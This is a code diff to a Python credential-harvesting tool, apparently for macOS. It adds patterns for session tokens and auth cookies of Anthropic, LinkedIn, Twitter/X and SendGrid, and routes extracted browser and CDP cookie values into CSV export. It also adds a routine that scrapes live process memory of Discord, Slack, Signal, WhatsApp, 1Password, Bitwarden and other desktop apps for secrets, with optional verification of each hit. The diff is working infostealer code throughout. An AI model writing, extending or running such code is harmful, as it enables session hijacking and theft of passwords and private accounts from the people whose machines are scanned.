@@ -302,6 +302,11 @@ CREDENTIAL_PATTERNS: dict[str, re.Pattern] = {
     "Vault Token":         re.compile(rb"hvs\.[A-Za-z0-9]{90,}"),
     "Anthropic API Key":   re.compile(rb"sk-ant-[A-Za-z0-9\-_]{90,}"),
     "SSH Private Key":     re.compile(rb"(-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[^-]{100,4096}-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----)"),
+    "Anthropic session":   re.compile(rb"20111[A-Za-z0-9\-_]{20,}"),
+    "Session key":         re.compile(rb"(?i)sessionKey[\"'\s]*[=:][\"'\s]*([A-Za-z0-9\-._~+/]{20,256})"),
+    "LinkedIn li_at":      re.compile(rb"li_at=([A-Za-z0-9%._\-]{30,})"),
+    "Twitter auth_token":  re.compile(rb"auth_token=([A-Fa-f0-9]{32,40})"),
+    "Sendgrid token":      re.compile(rb"SG\.[A-Za-z0-9_\-]{22,}\.[A-Za-z0-9_\-]{43,}"),
 }
 
 _NOISE_BYTES = re.compile(
@@ -347,6 +352,11 @@ _QUICK_PREFIXES: tuple[bytes, ...] = (
     b"sk-ant-",
     b"AKIA", b"ASIA", b"AROA", b"AIDA",
     b"-----BEGIN",
+    b"20111",          # Anthropic session token
+    b"li_at=",         # LinkedIn auth cookie
+    b"auth_token=",    # Twitter/X auth cookie
+    b"SG.",            # SendGrid API key
+    b"sessionKey",     # Anthropic / generic session key
 )
 
 
@@ -368,6 +378,11 @@ _HIT_TIER: dict[str, int] = {
     "OAuth access_token": 1, "OAuth refresh_token": 1,
     "Session token": 1,
     "Session ID": 2, "Cookie header": 2, "Set-Cookie header": 2,
+    "Anthropic session": 0,
+    "LinkedIn li_at":    0,
+    "Twitter auth_token": 0,
+    "Sendgrid token":    0,
+    "Session key":       1,
 }
 
 
@@ -1183,6 +1198,10 @@ def identify_service(label: str, value: str, context: bytes = b"") -> str:
     if label == "Vault Token":       return "HashiCorp Vault"
     if label == "Anthropic API Key": return "Anthropic / Claude"
     if label == "SSH Private Key":   return "SSH"
+    if label == "Anthropic session":   return "Anthropic / Claude"
+    if label == "LinkedIn li_at":      return "LinkedIn"
+    if label == "Twitter auth_token":  return "Twitter / X"
+    if label == "Sendgrid token":      return "SendGrid"
     if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", v):
         return "Anthropic / Claude"
     if label == "JWT token" or (v.startswith("eyJ") and v.count(".") == 2):
@@ -1448,6 +1467,13 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
                             lines.append(f"    Name:     {ck['name']}")
                             lines.append(f"    Value:    {ck['value']}")
                             lines.append(f"    Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck['samesite']}\n")
+                            cookie_val = ck.get("value", "")
+                            if cookie_val and not cookie_val.startswith("<"):
+                                csv_rows.append({
+                                    "browser": name, "profile": profile_name,
+                                    "label":   "Cookie", "service": ck["host"],
+                                    "value":   f"{ck['name']}={cookie_val}", "address": ck["host"],
+                                })
                         disk_cookie_keys.update((c["host"], c["name"]) for c in cookies)
                     else:
                         lines.append("  [-] None found")
@@ -1467,6 +1493,13 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
                     lines.append(f"  Name:     {ck['name']}")
                     lines.append(f"  Value:    {ck['value']} [CDP-only]")
                     lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{ck['samesite']}\n")
+                    cookie_val = ck.get("value", "")
+                    if cookie_val:
+                        csv_rows.append({
+                            "browser": name, "profile": "(CDP)",
+                            "label":   "Cookie", "service": ck["host"],
+                            "value":   f"{ck['name']}={cookie_val}", "address": ck["host"],
+                        })
             else:
                 lines.append("  [-] No additional CDP-only cookies (all covered by disk extraction)")
         else:
@@ -1575,6 +1608,112 @@ def process_browser(name: str, process_name: str, user_data_path: str, keychain_
             else:
                 val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
                 lines.append(f"  {label[:COL_TYPE]:<{COL_TYPE}}  {svc[:COL_SVC]:<{COL_SVC}}  {val}")
+            if do_verify:
+                result = verify_hit(label, h["value"], h["_svc"])
+                lines.append(f"    └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")
+
+    return lines, csv_rows
+
+
+# ── Electron / desktop app scraping ───────────────────────────────────────────
+
+# Process names on macOS match the CFBundleExecutable (no .app extension)
+ELECTRON_APPS: list[tuple[str, str]] = [
+    ("Discord",             "Discord"),
+    ("Discord PTB",         "Discord PTB"),
+    ("Discord Canary",      "Discord Canary"),
+    ("Slack Desktop",       "Slack"),
+    ("Microsoft Teams",     "Microsoft Teams"),
+    ("WhatsApp Desktop",    "WhatsApp"),
+    ("Telegram Desktop",    "Telegram"),
+    ("Signal Desktop",      "Signal"),
+    ("VS Code",             "Electron"),   # VS Code renderer process on macOS
+    ("Cursor",              "Cursor"),
+    ("Obsidian",            "Obsidian"),
+    ("Notion Desktop",      "Notion"),
+    ("Figma Desktop",       "figma"),
+    ("1Password",           "1Password 7"),
+    ("Bitwarden Desktop",   "Bitwarden"),
+]
+
+
+def process_electron_app(name: str, process_name: str, max_hits: int,
+                          do_verify: bool = False) -> tuple[list[str], list[dict]]:
+    """Memory-only scrape for Electron/desktop apps (no disk extraction)."""
+    lines: list[str] = []
+    csv_rows: list[dict] = []
+
+    pids = find_pids(process_name)
+    if not pids:
+        return lines, csv_rows
+
+    lines.append("\n" + "=" * 70)
+    lines.append(f"  APP: {name}  [RUNNING  {len(pids)} PID(s)]")
+    lines.append("=" * 70)
+    lines.append("\n  -- [MEMORY] Electron / Desktop App Scrape --")
+
+    all_hits: list[dict] = []
+    errors: list[str] = []
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(pids), 4)) as pool:
+        futures = {pool.submit(scrape_pid, pid, max_hits): pid for pid in pids}
+        for future in concurrent.futures.as_completed(futures):
+            pid = futures[future]
+            try:
+                all_hits.extend(future.result())
+            except PermissionError as e:
+                errors.append(f"PID {pid}: {e}")
+            except Exception as e:
+                errors.append(f"PID {pid}: {e}")
+
+    for e in errors:
+        lines.append(f"  [-] {e}")
+
+    unique_hits = deduplicate(all_hits)
+    raw_count   = len(all_hits)
+
+    if not unique_hits:
+        lines.append("  [-] No credential hits found")
+        return lines, csv_rows
+
+    lines.append(
+        f"[+] {len(unique_hits)} unique hit(s)"
+        + (f"  ({raw_count} raw, {raw_count - len(unique_hits)} dupes removed)"
+           if raw_count > len(unique_hits) else f"  (across {len(pids)} PID(s))")
+    )
+    lines.append("")
+
+    for h in unique_hits:
+        h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))
+        csv_rows.append({
+            "browser": name, "profile": "(memory)",
+            "label":   h["label"], "service": h["_svc"],
+            "value":   h["value"], "address": h.get("address", ""),
+        })
+
+    by_label: dict[str, list[dict]] = {}
+    for h in unique_hits:
+        by_label.setdefault(h["label"], []).append(h)
+
+    COL_TYPE = 22
+    COL_SVC  = 28
+    prev_label = None
+    for label in sorted(by_label, key=lambda l: (_HIT_TIER.get(l, 1), l)):
+        group = by_label[label]
+        tier  = _HIT_TIER.get(label, 1)
+        if prev_label is not None:
+            lines.append("")
+        prev_label = label
+        if tier == 2:
+            svc_counts: dict[str, int] = {}
+            for h in group:
+                svc_counts[h["_svc"]] = svc_counts.get(h["_svc"], 0) + 1
+            svc_summary = "  ".join(f"{s} ({c})" for s, c in sorted(svc_counts.items()))
+            lines.append(f"  {label}  ({len(group)} unique)  -  {svc_summary}")
+            continue
+        for h in group:
+            val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
+            lines.append(f"  {label[:COL_TYPE]:<{COL_TYPE}}  {h['_svc'][:COL_SVC]:<{COL_SVC}}  {val}")
             if do_verify:
                 result = verify_hit(label, h["value"], h["_svc"])
                 lines.append(f"    └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")
@@ -1774,6 +1913,13 @@ def main():
                     lines.append("  [-] No cookies found")
             except Exception as e:
                 lines.append(f"  [-] Cookie extraction error: {e}")
+
+    # ── Electron / Desktop apps ───────────────────────────────────────────────
+    if do_memory:
+        for app_name, app_proc in ELECTRON_APPS:
+            app_lines, app_csv = process_electron_app(app_name, app_proc, args.max_hits, args.verify)
+            lines.extend(app_lines)
+            all_csv_rows.extend(app_csv)
 
     report = "\n".join(lines)
 
